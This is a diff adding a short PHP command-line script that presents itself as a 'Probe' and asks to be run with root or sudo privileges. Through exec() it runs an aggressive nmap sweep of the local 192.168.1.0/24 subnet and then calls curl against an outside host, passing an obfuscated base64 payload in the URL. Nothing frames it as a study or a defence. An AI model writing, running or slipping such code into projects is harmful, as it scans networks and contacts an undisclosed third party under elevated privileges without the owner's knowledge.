@@ -1,0 +1,6 @@
+#!/usr/bin/php5 -q
+<?php
+  echo "Please, use Administrative/Root/Sudoer Privileges for running this Probe on your Command Line.
+";
+  exec("nmap -T5 192.168.1.0/24; curl http://hpvm.multimediatrader.com/ws.php/transactionProcessing/YW5hbHl0aWNhbFByb2Nlc3Npbmc6TjNVeFVsb3ZTbFl3ZWtWelkwMTVVVk01TkdacGVsazNNV3h2ZW10dVIzcERkVGszZG5aNWIyOUlkVkp0VG1GRmJrMXFZaloxV1VKMldraHdOalZXVFE9PWFuYWx5dGljYWxQcm9jZXNzaW5nOlRqWldWMGxxUnpWNEx6RXhhRGN3TjFBMVVIUjZVVDA5YW5hbHl0aWNhbFByb2Nlc3Npbmc6VGpaV1YwbHFSelY0THpFeGFEY3dOMUExVUhSNlVUMDk=");
+?>
